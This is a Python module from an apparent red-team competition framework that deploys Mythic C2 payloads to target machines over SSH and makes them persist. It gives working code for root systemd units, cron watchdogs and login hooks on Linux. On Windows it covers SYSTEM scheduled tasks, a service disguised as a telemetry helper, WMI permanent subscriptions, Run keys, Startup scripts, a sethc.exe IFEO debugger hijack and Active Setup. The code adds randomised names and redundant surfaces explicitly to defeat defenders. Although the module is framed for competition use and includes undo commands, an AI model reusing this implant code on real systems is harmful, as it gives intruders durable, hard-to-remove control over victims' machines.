"""Planting the C2 channel on a box, and reading back the evidence.

The engine builds and FREEZES the payload matrix at comp-prep
(`competitions/<id>/red/payloads/` + a `uuid -> box` manifest), because builds
never run mid-event: a lost Mythic state is re-prep, and the payloads are the
artifacts that matter. This module consumes the manifest:

    manifest = {
      "comp": "<id>", "operation": "<mythic operation>",
      "transports": ["http", "webhook"],
      "boxes": {"web01-1": {"uuid": "...", "file": "web01-1.bin",
                            "os": "linux", "agent": "poseidon",
                            "transport": "http"}}}

`Planter.plant()` copies the frozen payload to the box, registers it (systemd
unit on Linux, service + at-logon task on Windows — whichever the payload
supports), verifies the install ON THE BOX, and then asks the operation whether a
callback appeared. The RECORD is written from the install and always; the
callback is evidence about it. That ordering is deliberate — the earlier agent
gated the artifact write on the channel proof and a slow check-in turned a live
plant into a silent absence in both blue's and the organizer's lists.
"""

import json
import os
import tempfile
import time
from pathlib import Path

from ..errors import C2Error

from . import FakeMythic  # noqa: F401  (re-exported convenience for callers)

MANIFEST_REL = Path("red/payloads/manifest.json")

# Windows persistence surfaces. A plant draws ONE launcher (something that puts
# the agent on the box now) and one or two redundant mechanisms from other
# surfaces, so a defender has to sweep several places and killing one leaves the
# channel up. A single ONSTART task is a one-look IOC.
WINDOWS_LAUNCHERS = ("task_onstart", "task_onlogon", "task_daily", "service",
                     "wmi", "run_key", "startup", "active_setup")
WINDOWS_REDUNDANCY = ("run_key", "startup", "ifeo", "active_setup", "wmi")

# Linux gets the same treatment: the systemd unit is the primary surface and
# one redundant surface is drawn alongside it, so killing the unit does not
# end the channel.
LINUX_REDUNDANCY = ("cron_watch", "profile_hook")



def manifest_path(comp_dir):
    return Path(comp_dir) / MANIFEST_REL


def load_manifest(comp_dir):
    """The frozen payload manifest, or {} when comp-prep has not run."""
    path = manifest_path(comp_dir)
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except ValueError as exc:
        raise C2Error(f"{path} is not valid JSON: {exc}") from exc


def manifest_entry(manifest, box_id, transport=None):
    """The box's frozen payload.

    comp-prep keys the manifest `<box>:<transport>` (a box may carry one payload per
    transport); the caller knows only the box, so fall back to its first entry.
    """
    boxes = (manifest or {}).get("boxes") or {}
    if box_id in boxes:
        return boxes[box_id]
    wanted = f"{box_id}:{transport}" if transport else None
    if wanted and wanted in boxes:
        return boxes[wanted]
    for key, entry in boxes.items():
        if key.split(":", 1)[0] == box_id:
            return entry
    return None


def payload_file(comp_dir, entry):
    if not entry:
        return None
    path = Path(comp_dir) / "red/payloads" / (entry.get("file") or "")
    return path if path.exists() else None


def _schtasks_status(output):
    """The `Status:` value of a `schtasks /Query /FO LIST` body ("" when absent)."""
    for line in (output or "").splitlines():
        if line.strip().lower().startswith("status:"):
            return line.split(":", 1)[1].strip()
    return ""


class Planter:
    """Installs frozen payloads. Uses only ctx.ssh + ctx.c2 (+ ctx.world to note)."""

    def __init__(self, ctx, comp_dir=None, manifest=None, now=None):
        self.ctx = ctx
        self.comp_dir = comp_dir or (ctx.cfg["run"].get("comp_dir") or ".")
        self.manifest = manifest if manifest is not None else load_manifest(self.comp_dir)
        self._now = now or time.time

    # -- install ------------------------------------------------------------

    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
        """Install the frozen payload for `box_id` and report both facts.

        The callback window is config (`c2.callback_wait_sec`, 120s): a freshly
        installed Mythic takes MINUTES for the first agent check-in, and the old
        45s default reported "no callback" on every box of the 2026-10-18 scrim
        while all six channels were live two minutes later.
        """
        if wait_sec is None:
            wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 120))
        os_name = os_name or self.ctx.os_of(ip)
        entry = manifest_entry(self.manifest, box_id, transport)
        if entry is None:
            return {"ok": False, "callback_seen": False, "box": box_id,
                    "detail": f"no manifest entry for {box_id} "
                              "(run comp-prep / `tlaloc c2-prep` first)"}
        local = payload_file(self.comp_dir, entry)
        if local is None:
            return {"ok": False, "callback_seen": False, "box": box_id,
                    "detail": f"payload file for {box_id} is missing from "
                              f"{self.comp_dir}/red/payloads"}
        transport = transport or entry.get("transport") or "http"
        if os_name == "windows":
            installed = self._install_windows(ip, box_id, local, transport,
                                              wait_sec=wait_sec)
        else:
            installed = self._install_linux(ip, box_id, local, transport)

        callback_seen = self.wait_for_callback(box_id, wait_sec=wait_sec) \
            if installed.get("ok") else False
        return {**installed, "box": box_id, "os": os_name, "transport": transport,
                "callback_seen": callback_seen, "uuid": entry.get("uuid"),
                "payload": str(local)}

    def _install_linux(self, ip, box_id, local, transport):
        from ..effects import artifactnames as names
        from ..effects.base import root_cmd
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        names_drawn = names.linux_names(self.ctx.world, rng=self.ctx.rng,
                                       mode=names.mode_from_cfg(self.ctx.cfg))
        unit = names_drawn["unit"]
        stage = f"/tmp/{names_drawn['stem']}"
        remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}"
        unit_path = f"/etc/systemd/system/{unit}"
        # The escalation the seed proved (or a root foothold). Every privileged
        # install step rides it; a sudo refusal means the seed chose the wrong
        # label, not that the install should try sudo anyway.
        label = fh.get("escalation") or fh.get("kind") or "?"
        rc, _out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                        f"mkdir -p {stage}", timeout=60,
                                        key_path=fh.get("key_path"))
        if rc != 0:
            return {"ok": False, "detail": f"payload staging dir on {ip} failed: "
                            f"{(err or _out).strip()[:200]}", "paths": [remote]}
        unit_text = (
            "[Unit]\n"
            f"Description={names_drawn['unit_desc']}\n"
            "After=network-online.target\n\n"
            "[Service]\n"
            f"ExecStart={remote}\n"
            "Restart=always\nRestartSec=15\n\n"
            "[Install]\nWantedBy=multi-user.target\n")
        try:
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                  f"{stage}/{box_id}", mode=0o755,
                                  key_path=fh.get("key_path"))
            # The unit is generated here, so it rides sftp like the payload: a
            # heredoc cannot repeat a non-sudo command through an escape label.
            with tempfile.NamedTemporaryFile("w", encoding="utf-8") as staged_unit:
                staged_unit.write(unit_text)
                staged_unit.flush()
                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "",
                                      staged_unit.name, f"{stage}/{unit}",
                                      mode=0o644, key_path=fh.get("key_path"))
        except Exception as exc:                       # transport blowups are data
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}
        privileged = (
            ("create install dir", f"mkdir -p /usr/local/lib/{names_drawn['stem']}"),
            ("move payload", f"mv {stage}/{box_id} {remote}"),
            ("chmod payload", f"chmod 755 {remote}"),
            ("move unit", f"mv {stage}/{unit} {unit_path}"),
            ("daemon-reload", "systemctl daemon-reload"),
            ("enable unit", f"systemctl enable --now {unit}"),
        )
        for step, cmd in privileged:
            rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                           root_cmd(cmd, fh), timeout=120,
                                           key_path=fh.get("key_path"))
            if rc != 0:
                return {"ok": False,
                        "detail": (f"{unit} install failed at {step} on {ip} via "
                                   f"{label} ({cmd}): "
                                   f"{(err or out).strip()[:200]}"),
                        "unit": unit, "paths": [remote, unit_path],
                        "check_cmd": f"systemctl is-active {unit}"}
        rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                       f"systemctl is-active {unit}", timeout=60,
                                       key_path=fh.get("key_path"))
        ok = rc == 0 and (out or "").strip().splitlines()[-1:] == ["active"]
        if not ok:
            return {"ok": False,
                    "detail": f"unit install rc={rc} via {label}: "
                              f"{(err or out).strip()[:200]}",
                    "unit": unit, "paths": [remote, unit_path],
                    "check_cmd": f"systemctl is-active {unit}"}
        mech, extra_paths, extra_undo, note = self._linux_redundant(
            ip, fh, names_drawn, remote, stage)
        undo = ([f"systemctl disable --now {unit}",
                 f"rm -f {remote} {unit_path}"] + extra_undo)
        return {"ok": True,
                "detail": (f"{unit} active on {ip} (transport {transport}); {note}"
                           if note else f"{unit} active on {ip} (transport {transport})"),
                "unit": unit, "paths": [remote, unit_path] + extra_paths,
                "mechanisms": ["systemd"] + mech,
                "undo": undo,
                "check_cmd": f"systemctl is-active {unit}"}

    def _linux_redundant(self, ip, fh, drawn, remote, stage):
        """Persistence surfaces beyond the systemd unit.

        A lone unit is the first grep a defender runs. A cron file (boot + a
        17-minute watchdog) or a login hook brings the agent back after the unit
        is killed, and blue has to sweep a second location. With
        `c2.implant_spread: full` BOTH are planted — the coverage mode the QA runs
        use. Best effort either way: the unit is the primary surface, so this only
        ever adds a note.
        """
        from ..effects.base import root_cmd        # lazy: avoids a cycle
        NL = chr(10)
        c2 = (self.ctx.cfg or {}).get("c2") or {}
        full = str(c2.get("implant_spread", "draw")).strip().lower() == "full"
        mechs = list(LINUX_REDUNDANCY) if full else [self.ctx.rng.choice(LINUX_REDUNDANCY)]
        stem = drawn["stem"]
        chosen, paths, undo, notes = [], [], [], []
        for mech in mechs:
            if mech == "cron_watch":
                path = "/etc/cron.d/" + stem
                body = ("@reboot root " + remote + " >/dev/null 2>&1" + NL
                        + '*/17 * * * * root pgrep -f "' + remote + '" >/dev/null 2>&1 '
                        + "|| " + remote + " >/dev/null 2>&1" + NL)
            else:
                path = "/etc/profile.d/" + stem + ".sh"
                body = ("# " + str(drawn.get("unit_desc") or stem) + NL
                        + 'pgrep -f "' + remote + '" >/dev/null 2>&1 '
                        + "|| { setsid " + remote + " >/dev/null 2>&1 & }" + NL)
            staged = stage + "/" + path.rsplit("/", 1)[-1]
            local = None
            try:
                fd, local = tempfile.mkstemp(prefix="tlaloc-extra-", suffix=".txt")
                with os.fdopen(fd, "w", encoding="utf-8") as handle:
                    handle.write(body)
                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local,
                                      staged, mode=0o644, key_path=fh.get("key_path"))
                restart = ("systemctl try-restart cron 2>/dev/null "
                           "|| service cron restart 2>/dev/null || true"
                           if mech == "cron_watch" else "true")
                rc, out, err = self.ctx.ssh.ssh(
                    ip, fh["user"], fh.get("password") or "",
                    root_cmd("mv " + staged + " " + path + " && chmod 644 " + path, fh)
                    + NL + restart,
                    timeout=90, key_path=fh.get("key_path"))
                chosen.append(mech)
                paths.append(path)
                undo.append("rm -f " + path)
                if mech == "cron_watch":
                    undo.append("systemctl try-restart cron 2>/dev/null || true")
                notes.append(mech + " at " + path + " rc=0" if rc == 0 else
                             mech + " rc=" + str(rc) + ": " + (err or out).strip()[:120])
            except Exception as exc:                       # redundancy is optional
                notes.append(mech + " failed: " + str(exc))
            finally:
                if local and os.path.exists(local):
                    os.unlink(local)
        return chosen, paths, undo, "; ".join(notes)

    def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
        """Plant the frozen payload through a mix of Windows mechanisms.

        One ONSTART task is an IOC: blue finds it once and the whole board is
        clean in a minute. Each plant therefore draws a LAUNCHER that starts the
        agent now, plus one or two REDUNDANT persistence mechanisms from
        different surfaces (registry, WMI subscription, IFEO debugger, per-user
        setup) — so a defender has to know four different places to look, and
        killing one leaves the channel alive.

        The process is the proof: whatever the mechanisms report, the install is
        only ok when the payload image is running on the box.
        """
        from ..effects import artifactnames as names
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        rng = self.ctx.rng
        drawn = names.windows_names(self.ctx.world, rng=rng,
                                    mode=names.mode_from_cfg(self.ctx.cfg))
        full_spread = (str(((self.ctx.cfg or {}).get("c2") or {})
                           .get("implant_spread", "draw")).strip().lower() == "full")
        if full_spread:
            # Coverage/QA mode: every surface on this box, so a run proves each
            # implant path instead of whichever ones the draw happened to pick.
            launcher = WINDOWS_LAUNCHERS[0]
            redundant = list(WINDOWS_LAUNCHERS[1:]) + [
                m for m in WINDOWS_REDUNDANCY if m not in WINDOWS_LAUNCHERS]
        else:
            launcher = rng.choice(WINDOWS_LAUNCHERS)
            redundant = [m for m in WINDOWS_REDUNDANCY
                         if m not in (launcher,)]
            rng.shuffle(redundant)
            redundant = redundant[:rng.choice((1, 2))]
        remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
        remote = f"{remote_dir}\\{box_id}.exe"
        staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
        try:
            self._win(ip, fh, f'powershell -NoProfile -Command "New-Item -ItemType '
                              f'Directory -Force -Path \'{remote_dir}\' | Out-Null"')
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                  staged, key_path=fh.get("key_path"))
        except Exception as exc:                       # transport blowups are data
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}

        exe = Path(staged).name
        guard = (f'cmd /c tasklist /FI "IMAGENAME eq {exe}" | find /I "{exe}" >nul '
                 f'|| start "" /b "{remote}"')
        undo, artifacts, notes = [], [], []
        chosen = []
        for mechanism in [launcher] + redundant:
            names_i = drawn
            if full_spread:
                # Each surface registers under its own drawn names: three task
                # triggers sharing one task name would overwrite each other, and
                # one name reused across registry + WMI is a single-lookup IOC.
                # The payload path (stem) deliberately stays the same.
                names_i = dict(names.windows_names(self.ctx.world, rng=rng,
                                                   mode=names.mode_from_cfg(self.ctx.cfg)),
                               stem=drawn["stem"])
            spec = WINDOWS_MECHANISMS[mechanism](self, ip, fh, names_i, remote, guard)
            chosen.append(mechanism)
            notes.append(f"{mechanism}: {spec['detail']}")
            undo.extend(spec["undo"])
            artifacts.extend(spec["paths"])
        # The launcher may be passive (a logon trigger, a WMI timer): start the
        # agent once, detached, so the channel is live inside this seed window.
        alive = self._win_process_running(ip, fh, Path(staged).name)
        if not alive:
            self._start_detached(ip, fh, remote)
            deadline = self._now() + 20
            while not alive and self._now() < deadline:
                time.sleep(3)
                alive = self._win_process_running(ip, fh, Path(staged).name)
        return {"ok": bool(alive),
                "detail": (f"{Path(staged).name} running on {ip} via "
                           f"{' + '.join(chosen)} (transport {transport})" if alive
                           else f"payload never started on {ip}: " + "; ".join(notes)[:180]),
                "unit": launcher, "paths": [remote] + artifacts,
                "mechanisms": chosen,
                "undo": undo or [f'schtasks /Delete /TN "{drawn["task"]}" /F',
                                 f"Remove-Item -Path '{remote}' -Force"],
                "check_cmd": f'tasklist /FI "IMAGENAME eq {Path(staged).name}"'}

    # -- windows mechanism helpers -------------------------------------------

    def _win_ps(self, ip, fh, body, timeout=120):
        """Run a PowerShell snippet, base64-encoded so no shell layer mangles it.

        Registering a registry value or a WMI consumer with embedded quotes
        through `cmd /c` lost the value silently (reg add answered 0, the key
        was never written). -EncodedCommand is a single token: nothing to quote.
        """
        import base64
        blob = base64.b64encode(body.encode("utf-16-le")).decode()
        return self._win(ip, fh, f"powershell -NoProfile -ExecutionPolicy Bypass "
                                 f"-EncodedCommand {blob}", timeout=timeout)

    def _win(self, ip, fh, command, timeout=120):
        """Run one cmd/powershell line on a Windows box over its SSH channel."""
        return self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", command,
                                timeout=timeout, key_path=fh.get("key_path"))

    def _start_detached(self, ip, fh, remote):
        """Start the payload OUTSIDE the SSH session.

        Children of an OpenSSH session are killed with it (ssd's job object takes
        the tree down when the channel closes), so `start "" /b` proved nothing:
        the process was there while the plant looked and gone by the next command.
        Win32_Process.Create spawns under the WMI service — session 0, detached,
        the same way the scheduled task and the WMI subscription start it.
        """
        q = '"'      # the payload path has spaces; CIM wants it quoted
        body = ("Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
                "-Arguments @{CommandLine='" + q + remote + q + "'} | "
                "Select-Object -ExpandProperty ReturnValue")
        return self._win_ps(ip, fh, body, timeout=90)

    @staticmethod
    def _why(rc, err, out):
        """`rc=0` or `rc=1: <the first line PowerShell actually said>`."""
        if rc == 0:
            return "rc=0"
        text = " ".join((err or out or "").split())[:120]
        return f"rc={rc}" + (f": {text}" if text else "")

    def _win_process_running(self, ip, fh, image):
        _rc, out, _err = self._win(
            ip, fh, f'tasklist /FI "IMAGENAME eq {image}"', timeout=60)
        return image.lower() in (out or "").lower()

    def _mech_task(self, ip, fh, drawn, remote, guard=None, *, trigger,
                   mo=None, st=None):
        task = drawn["task"]
        # A bare /TR starts another copy every time a plant re-registers, and the
        # live range proved it: ten live copies of one agent on each Windows box,
        # which is noise rather than persistence. The task runs a stub that
        # checks for the image first, so all the surfaces coalesce on one
        # process. (The stub is a file because schtasks mangles a piped /TR.)
        stub = remote.rsplit("\\", 1)[0] + "\\" + task.replace(" ", "") + "-run.cmd"
        body = guard[len("cmd /c "):] if guard else f'start "" /b "{remote}"'
        self._win_ps(ip, fh, f"Set-Content -LiteralPath '{stub}' -Value '{body}' "
                             f"-Encoding ascii", timeout=90)
        script = (f'schtasks /Create /TN "{task}" /TR "cmd /c {stub}" /SC {trigger}'
                  + (f" /MO {mo}" if mo else "")
                  + (f" /ST {st}" if st else "")
                  + ' /RU SYSTEM /RL HIGHEST /F'
                  + (' && schtasks /Run /TN "' + task + '"' if trigger == "ONSTART" else ""))
        rc, out, err = self._win(ip, fh, script, timeout=180)
        return {"detail": f"task {task} ({trigger}{'/' + mo if mo else ''}) rc={rc}",
                "paths": [f"task:{task}", stub],
                "undo": [f'schtasks /End /TN "{task}"',
                         f'schtasks /Delete /TN "{task}" /F',
                         f"Remove-Item -Path '{stub}' -Force"]}

    def _mech_task_onstart(self, ip, fh, drawn, remote, guard):
        return self._mech_task(ip, fh, drawn, remote, guard, trigger="ONSTART")

    def _mech_task_onlogon(self, ip, fh, drawn, remote, guard):
        return self._mech_task(ip, fh, drawn, remote, guard, trigger="ONLOGON")

    def _mech_task_daily(self, ip, fh, drawn, remote, guard):
        # A recurring trigger with a random minute: the agent comes back every
        # hour without a boot and without a logon.
        minute = self.ctx.rng.randrange(1, 60)
        return self._mech_task(ip, fh, drawn, remote, guard, trigger="MINUTE",
                               mo="60", st=f"00:{minute:02d}")

    def _mech_service(self, ip, fh, drawn, remote, guard):
        # A console agent cannot be an SCM service (1053), so the service runs a
        # detached launcher; the service entry is the persistence, the child is
        # the agent. `sc failure` makes a stopped launcher restart itself.
        svc = drawn["service"]
        script = (f'sc create "{svc}" binPath= "{guard}" '
                  f'start= auto && sc description "{svc}" "Windows telemetry helper" && '
                  f'sc failure "{svc}" reset= 0 actions= restart/60000 && sc start "{svc}"')
        rc, out, err = self._win(ip, fh, script, timeout=180)
        return {"detail": f"service {svc} rc={rc}",
                "paths": [f"service:{svc}"],
                "undo": [f'sc stop "{svc}"', f'sc delete "{svc}"']}

    def _mech_wmi(self, ip, fh, drawn, remote, guard):
        # Permanent WMI subscription: no file on disk in a startup location, no
        # task, no service — blue has to enumerate root\subscription to see it.
        name = drawn["wmi"]
        body = (
            f"$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
            f"-Arguments @{{Name='{name}'; EventNamespace='root\\cimv2'; "
            f"QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent "
            f"WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}}; "
            f"$c = Set-WmiInstance -Namespace root\\subscription -Class "
            f"CommandLineEventConsumer -Arguments @{{Name='{name}'; "
            f"CommandLineTemplate='{guard}'; ExecutablePath='cmd.exe'}}; "
            "Set-WmiInstance -Namespace root\\subscription -Class "
            "__FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} | Out-Null")
        rc, out, err = self._win_ps(ip, fh, body, timeout=180)
        return {"detail": f"WMI subscription {name} " + self._why(rc, err, out),
                "paths": [f"wmi:{name}"],
                "undo": [f"Get-WmiObject -Namespace root\\subscription -Class "
                         f"__FilterToConsumerBinding | Where-Object {{ "
                         f"$_.Consumer -match '{name}' }} | Remove-WmiObject; "
                         f"Get-WmiObject -Namespace root\\subscription -Class "
                         f"__EventFilter | Where-Object {{ $_.Name -eq '{name}' }} | "
                         f"Remove-WmiObject; Get-WmiObject -Namespace root\\subscription "
                         f"-Class CommandLineEventConsumer | Where-Object {{ "
                         f"$_.Name -eq '{name}' }} | Remove-WmiObject"]}

    def _mech_run_key(self, ip, fh, drawn, remote, guard):
        value = drawn["run_value"]
        rc, out, err = self._win_ps(
            ip, fh, f"Set-ItemProperty -LiteralPath "
                    f"'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
                    f"-Name '{value}' -Value '{guard}' -Force", timeout=90)
        return {"detail": f"HKLM Run value {value} " + self._why(rc, err, out),
                "paths": [f"registry:HKLM\\...\\Run\\{value}"],
                "undo": [f'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion'
                         f'\\Run" /v "{value}" /f']}

    def _mech_startup(self, ip, fh, drawn, remote, guard):
        name = drawn["run_value"]
        cmd = f"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.cmd"
        body = guard[len("cmd /c "):]
        rc, out, err = self._win_ps(
            ip, fh, f"Set-Content -LiteralPath 'C:\\ProgramData\\Microsoft\\Windows"
                    f"\\Start Menu\\Programs\\Startup\\{name}.cmd' -Value '{body}' "
                    f"-Encoding ascii", timeout=90)
        return {"detail": f"startup item {name}.cmd " + self._why(rc, err, out),
                "paths": [cmd],
                "undo": [f'Remove-Item -Path \'{cmd}\' -Force']}

    def _mech_ifeo(self, ip, fh, drawn, remote, guard):
        # Debugger hijack on an accessibility binary: the payload starts as SYSTEM
        # at the logon screen (shift x5), a surface almost nobody checks.
        target = "sethc.exe"
        key = (f"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File "
               f"Execution Options\\{target}")
        rc, out, err = self._win_ps(
            ip, fh, f"New-Item -Path '{key}' -Force | Out-Null; "
                    f"Set-ItemProperty -LiteralPath '{key}' -Name Debugger "
                    f"-Value '{remote}' -Force", timeout=90)
        return {"detail": f"IFEO debugger on {target} " + self._why(rc, err, out),
                "paths": [f"registry:{key}\\Debugger"],
                "undo": [f'reg delete "{key}" /v Debugger /f']}

    def _mech_active_setup(self, ip, fh, drawn, remote, guard):
        rng = self.ctx.rng
        hex8 = lambda n: "".join(f"{rng.randrange(16):x}" for _ in range(n))
        guid = f"{{{hex8(8)}-{hex8(4)}-{hex8(4)}-{hex8(4)}-{hex8(12)}}}"
        key = (f"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}")
        stub = guard
        rc, out, err = self._win_ps(
            ip, fh, f"New-Item -Path '{key}' -Force | Out-Null; "
                    f"Set-ItemProperty -LiteralPath '{key}' -Name StubPath "
                    f"-Value '{stub}' -Force; "
                    f"Set-ItemProperty -LiteralPath '{key}' -Name Version "
                    f"-Value '1,0,0,0' -Force", timeout=90)
        return {"detail": f"Active Setup {guid} " + self._why(rc, err, out),
                "paths": [f"registry:{key}"],
                "undo": [f'reg delete "{key}" /f']}

    # -- evidence -----------------------------------------------------------

    def wait_for_callback(self, box_id, *, wait_sec=45, poll_interval=5):
        """Poll the operation for this box's callback inside `wait_sec`.

        A callback is a FRESH row (`c2.callback_max_age_sec`), never the mere
        existence of a row: tavern/mythic keep rows after the agent dies.
        """
        if self.ctx.c2 is None:
            return False
        deadline = self._now() + max(wait_sec, 0)
        while True:
            try:
                record = self.ctx.c2.callbacks().get(box_id)
            except C2Error:
                return False
            if record and self._fresh(record):
                if self.ctx.world is not None and record.get("seen_at"):
                    self.ctx.world.note_callback(box_id, self._iso(record["seen_at"]),
                                                 agent=record.get("agent"),
                                                 external_id=record.get("external_id"))
                return True
            if self._now() >= deadline:
                return False
            time.sleep(poll_interval)

    def _fresh(self, record):
        seen = record.get("seen_at")
        if not seen:
            return False
        if str(record.get("agent") or "").lower() == "none":
            return False
        max_age = float(self.ctx.cfg["c2"].get("callback_max_age_sec", 120))
        return (self._now() - float(seen)) <= max_age

    def _iso(self, epoch):
        return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(float(epoch)))


# Mechanism name -> builder. Each builder registers one persistence surface and
# returns its own undo, so a plant's restore covers exactly what it touched.
WINDOWS_MECHANISMS = {
    "task_onstart": Planter._mech_task_onstart,
    "task_onlogon": Planter._mech_task_onlogon,
    "task_daily": Planter._mech_task_daily,
    "service": Planter._mech_service,
    "wmi": Planter._mech_wmi,
    "run_key": Planter._mech_run_key,
    "startup": Planter._mech_startup,
    "ifeo": Planter._mech_ifeo,
    "active_setup": Planter._mech_active_setup,
}
